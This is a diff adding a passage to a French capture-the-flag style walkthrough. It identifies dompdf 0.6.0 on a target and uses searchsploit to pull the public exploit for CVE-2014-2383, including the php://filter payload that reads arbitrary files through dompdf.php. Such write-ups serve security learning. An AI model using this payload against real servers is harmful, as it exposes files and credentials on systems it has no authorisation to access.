@@ -66,4 +66,36 @@ Un WebDIR nous dévoile un directory /dompdf :
 
 Après quelques recherches [dompdf](https://github.com/dompdf/dompdf) est un convertisseur HTML to PDF.
 
-Nous pouvons trouver la version de cette outil dans le fichier /dompdf/VERSION.
+Nous pouvons trouver la version de cette outil dans le fichier /dompdf/VERSION. Nous avons ici **DOMPDF 0.6.0**.
+
+# Foothold + Scripting
+
+```sh
+❯ searchsploit dompdf 0.6.0
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                      |  Path
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read                                                                                                                | php/webapps/33004.txt
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+❯ searchsploit -m php/webapps/33004.txt
+  Exploit: dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read
+      URL: https://www.exploit-db.com/exploits/33004
+     Path: /usr/share/exploitdb/exploits/php/webapps/33004.txt
+
+❯ cat 33004.txt
+Vulnerability title: Arbitrary file read in dompdf
+CVE: CVE-2014-2383
+Vendor: dompdf
+Affected version: v0.6.0
+
+Command line interface:
+php dompdf.php
+php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>
+
+Web interface:
+   
+http://example/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>
+
+Further details at:
+https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2383/
+```
